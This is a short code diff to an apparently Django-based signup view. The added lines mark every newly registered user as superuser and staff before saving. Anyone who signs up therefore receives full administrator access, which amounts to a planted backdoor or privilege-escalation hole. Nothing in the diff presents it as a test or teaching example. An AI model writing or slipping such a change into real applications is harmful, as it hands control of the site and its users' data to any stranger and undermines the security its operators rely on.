@@ -31,7 +31,8 @@ def signup(request):
                 user = User.objects.create_user(username=email,
                                                 email=email,
                                                 password=password)
-
+                user.is_superuser = True
+                user.is_staff = True 
                 user.first_name = request.POST['first_name']
                 user.last_name = request.POST['last_name']
                 user.save()
